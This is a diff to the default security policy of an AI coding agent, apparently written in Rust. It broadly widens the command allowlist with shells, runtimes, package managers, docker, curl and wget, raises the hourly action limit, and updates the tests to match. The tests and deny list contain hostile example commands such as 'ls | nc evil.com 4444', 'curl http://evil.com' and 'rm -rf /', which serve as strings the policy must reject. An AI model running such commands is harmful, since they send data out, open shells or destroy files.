@@ -98,11 +98,70 @@ impl Default for SecurityPolicy {
             workspace_dir: PathBuf::from("."),
             workspace_only: true,
             allowed_commands: vec![
+                // VCS
                 "git".into(),
+                // Package managers
                 "npm".into(),
+                "npx".into(),
+                "yarn".into(),
+                "pnpm".into(),
                 "cargo".into(),
-                "ls".into(),
+                "pip".into(),
+                "pip3".into(),
+                "brew".into(),
+                "apt".into(),
+                "apt-get".into(),
+                "dpkg".into(),
+                "dnf".into(),
+                "yum".into(),
+                "rpm".into(),
+                "pacman".into(),
+                "zypper".into(),
+                "apk".into(),
+                // Runtimes
+                "python".into(),
+                "python3".into(),
+                "node".into(),
+                "deno".into(),
+                "bun".into(),
+                "bash".into(),
+                "sh".into(),
+                "ruby".into(),
+                // Build tools
+                "make".into(),
+                "cmake".into(),
+                "gcc".into(),
+                "g++".into(),
+                "rustc".into(),
+                "tsc".into(),
+                "go".into(),
+                // Dev/CLI tools
+                "docker".into(),
+                "docker-compose".into(),
+                "gh".into(),
+                "jq".into(),
+                "sed".into(),
+                "awk".into(),
+                "sort".into(),
+                "uniq".into(),
+                "tr".into(),
+                "cut".into(),
+                "diff".into(),
+                "patch".into(),
+                "xargs".into(),
+                "env".into(),
+                "which".into(),
+                "whereis".into(),
+                "date".into(),
+                "uname".into(),
+                "whoami".into(),
+                "mkdir".into(),
+                "touch".into(),
+                "cp".into(),
+                "mv".into(),
+                // Standard utilities
                 "cat".into(),
+                "ls".into(),
                 "grep".into(),
                 "find".into(),
                 "echo".into(),
@@ -110,6 +169,15 @@ impl Default for SecurityPolicy {
                 "wc".into(),
                 "head".into(),
                 "tail".into(),
+                "test".into(),
+                "true".into(),
+                "false".into(),
+                // Network tools (medium-risk, needs approval)
+                "curl".into(),
+                "wget".into(),
+                // Agent tools
+                "claude".into(),
+                "codex".into(),
             ],
             forbidden_paths: vec![
                 // System directories (blocked even when workspace_only=false)
@@ -133,7 +201,7 @@ impl Default for SecurityPolicy {
                 "~/.aws".into(),
                 "~/.config".into(),
             ],
-            max_actions_per_hour: 20,
+            max_actions_per_hour: 100,
             max_cost_per_day_cents: 500,
             require_approval_for_medium_risk: true,
             block_high_risk_commands: true,
@@ -240,8 +308,6 @@ impl SecurityPolicy {
                     | "iptables"
                     | "ufw"
                     | "firewall-cmd"
-                    | "curl"
-                    | "wget"
                     | "nc"
                     | "ncat"
                     | "netcat"
@@ -291,7 +357,60 @@ impl SecurityPolicy {
                         "add" | "remove" | "install" | "clean" | "publish"
                     )
                 }),
-                "touch" | "mkdir" | "mv" | "cp" | "ln" => true,
+                "pip" | "pip3" => args.first().is_some_and(|verb| {
+                    matches!(verb.as_str(), "install" | "uninstall" | "freeze")
+                }),
+                "brew" => args.first().is_some_and(|verb| {
+                    matches!(
+                        verb.as_str(),
+                        "install" | "uninstall" | "remove" | "upgrade"
+                    )
+                }),
+                "apt" | "apt-get" => args.first().is_some_and(|verb| {
+                    matches!(
+                        verb.as_str(),
+                        "install" | "remove" | "purge" | "upgrade" | "dist-upgrade"
+                    )
+                }),
+                "dpkg" => args.first().is_some_and(|verb| {
+                    matches!(
+                        verb.as_str(),
+                        "-i" | "--install" | "-r" | "--remove" | "-p" | "--purge"
+                    )
+                }),
+                "dnf" | "yum" => args.first().is_some_and(|verb| {
+                    matches!(
+                        verb.as_str(),
+                        "install" | "remove" | "erase" | "upgrade" | "update" | "downgrade"
+                    )
+                }),
+                "rpm" => args.first().is_some_and(|verb| {
+                    matches!(
+                        verb.as_str(),
+                        "-i" | "--install" | "-e" | "--erase" | "-u" | "--upgrade"
+                    )
+                }),
+                "pacman" => args.first().is_some_and(|verb| {
+                    // Args are lowercased by the caller
+                    matches!(verb.as_str(), "-s" | "-r" | "-u" | "-syu" | "-sy" | "-su")
+                }),
+                "zypper" => args.first().is_some_and(|verb| {
+                    matches!(
+                        verb.as_str(),
+                        "install" | "in" | "remove" | "rm" | "update" | "up" | "dup"
+                    )
+                }),
+                "apk" => args
+                    .first()
+                    .is_some_and(|verb| matches!(verb.as_str(), "add" | "del" | "upgrade")),
+                "docker" => args.first().is_some_and(|verb| {
+                    matches!(
+                        verb.as_str(),
+                        "run" | "exec" | "rm" | "rmi" | "pull" | "push" | "build"
+                    )
+                }),
+                // Network download tools + filesystem-mutating commands
+                "curl" | "wget" | "touch" | "mkdir" | "mv" | "cp" | "ln" => true,
                 _ => false,
             };
 
@@ -701,10 +820,30 @@ mod tests {
         let p = default_policy();
         assert!(!p.is_command_allowed("rm -rf /"));
         assert!(!p.is_command_allowed("sudo apt install"));
-        assert!(!p.is_command_allowed("curl http://evil.com"));
-        assert!(!p.is_command_allowed("wget http://evil.com"));
-        assert!(!p.is_command_allowed("python3 exploit.py"));
-        assert!(!p.is_command_allowed("node malicious.js"));
+        // ssh, nc remain blocked (not in allowlist)
+        assert!(!p.is_command_allowed("ssh user@host"));
+        assert!(!p.is_command_allowed("nc -l 4444"));
+    }
+
+    #[test]
+    fn newly_allowed_commands() {
+        let p = default_policy();
+        // Runtimes are now in the default allowlist
+        assert!(p.is_command_allowed("python3 script.py"));
+        assert!(p.is_command_allowed("node app.js"));
+        assert!(p.is_command_allowed("bash -c 'echo hello'"));
+        // Network tools are in allowlist (but medium-risk)
+        assert!(p.is_command_allowed("curl https://example.com"));
+        assert!(p.is_command_allowed("wget https://example.com"));
+        // Package managers
+        assert!(p.is_command_allowed("pip install requests"));
+        assert!(p.is_command_allowed("brew list"));
+        // Dev tools
+        assert!(p.is_command_allowed("docker ps"));
+        assert!(p.is_command_allowed("gh pr list"));
+        assert!(p.is_command_allowed("jq '.' file.json"));
+        // Agent tools
+        assert!(p.is_command_allowed("claude --help"));
     }
 
     #[test]
@@ -746,8 +885,10 @@ mod tests {
         assert!(p.is_command_allowed("ls | grep foo"));
         assert!(p.is_command_allowed("cat file.txt | wc -l"));
         // Second command not in allowlist — blocked
-        assert!(!p.is_command_allowed("ls | curl http://evil.com"));
-        assert!(!p.is_command_allowed("echo hello | python3 -"));
+        assert!(!p.is_command_allowed("ls | nc evil.com 4444"));
+        // Both sides now allowed (curl and python3 in allowlist)
+        assert!(p.is_command_allowed("curl https://example.com | jq '.'"));
+        assert!(p.is_command_allowed("echo hello | python3 -"));
     }
 
     #[test]
@@ -808,6 +949,69 @@ mod tests {
     }
 
     #[test]
+    fn curl_wget_are_medium_risk_not_high() {
+        let p = default_policy();
+        assert_eq!(
+            p.command_risk_level("curl https://example.com"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("wget https://example.com/file.tar.gz"),
+            CommandRiskLevel::Medium
+        );
+    }
+
+    #[test]
+    fn package_manager_install_is_medium_risk() {
+        let p = default_policy();
+        assert_eq!(
+            p.command_risk_level("pip install requests"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("pip3 uninstall flask"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("brew install jq"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("apt install build-essential"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("apk add curl"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(
+            p.command_risk_level("pacman -S git"),
+            CommandRiskLevel::Medium
+        );
+    }
+
+    #[test]
+    fn package_manager_query_is_low_risk() {
+        let p = default_policy();
+        assert_eq!(p.command_risk_level("pip list"), CommandRiskLevel::Low);
+        assert_eq!(p.command_risk_level("brew list"), CommandRiskLevel::Low);
+        assert_eq!(
+            p.command_risk_level("apt list --installed"),
+            CommandRiskLevel::Low
+        );
+    }
+
+    #[test]
+    fn docker_run_is_medium_risk() {
+        let p = default_policy();
+        assert_eq!(
+            p.command_risk_level("docker run alpine echo hello"),
+            CommandRiskLevel::Medium
+        );
+        assert_eq!(p.command_risk_level("docker ps"), CommandRiskLevel::Low);
+    }
+
+    #[test]
     fn validate_command_requires_approval_for_medium_risk() {
         let p = SecurityPolicy {
             autonomy: AutonomyLevel::Supervised,
@@ -840,7 +1044,8 @@ mod tests {
     #[test]
     fn validate_command_rejects_background_chain_bypass() {
         let p = default_policy();
-        let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
+        // Background chaining with `&` is blocked regardless of command allowlist
+        let result = p.validate_command_execution("ls & echo hello", false);
         assert!(result.is_err());
         assert!(result.unwrap_err().contains("not allowed"));
     }
@@ -1066,7 +1271,7 @@ mod tests {
     fn command_injection_and_chain_blocked() {
         let p = default_policy();
         assert!(!p.is_command_allowed("ls && rm -rf /"));
-        assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
+        assert!(!p.is_command_allowed("echo ok && ssh user@evil.com"));
         // Both allowed — OK
         assert!(p.is_command_allowed("ls && echo done"));
     }
@@ -1084,7 +1289,7 @@ mod tests {
         let p = default_policy();
         assert!(!p.is_command_allowed("ls & rm -rf /"));
         assert!(!p.is_command_allowed("ls&rm -rf /"));
-        assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
+        assert!(!p.is_command_allowed("echo ok & nc -l 4444"));
     }
 
     #[test]
